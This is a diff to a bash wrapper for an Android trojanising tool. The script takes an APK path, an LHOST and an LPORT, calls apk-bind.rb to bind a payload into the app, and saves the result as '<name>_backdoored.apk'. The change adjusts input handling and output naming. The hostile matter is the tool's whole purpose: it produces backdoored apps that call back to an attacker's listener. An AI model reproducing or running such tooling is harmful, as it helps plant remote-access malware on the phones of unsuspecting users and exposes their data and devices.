@@ -125,9 +125,11 @@ fi
 echo -ne "$yellow -> Enter path of apk : $green"
 # check for correct apk path
 while read apk_path; do
+    export apk_path=$(echo $apk_path | tr -d "'")
     if [ -e $apk_path ]; then break; else echo -e "$red Wrong path entered !! Enter again !!$nocol"; echo -ne "$green"; fi
 done
 export apk_name=$(basename $apk_path)
+export apk=$(echo $apk_name | sed 's/.apk$//')
 echo -ne $nocol
 
 echo -en "$yellow -> Enter LHOST : $green"
@@ -145,7 +147,12 @@ ruby apk-bind.rb $apk_name -p $payload $lhost $lport
 line
 
 # check for payload
-if [ -e $work_dir/old_backdoored.apk ];then
-   echo -e "$yellow -> Your modified apk is at\n\t$green $work_dir/old_backdoored.apk$nocol"
+if [ -e $work_dir/${apk}_backdoored.apk ];then
+   echo -e "$yellow -> Your modified apk is at\n\t$green $work_dir/${apk}_backdoored.apk$nocol"
+   line
+   echo -ne "$yellow -> Press Enter to move$green ${apk}_backdoored.apk$yellow to $cur_dir $nocol"
+   read enterkey
+   mv $work_dir/${apk}_backdoored.apk $cur_dir/ 2>/dev/null
+else echo -e "$red Unable to bind$green $apk_name $red!! $nocol"
 fi
 line
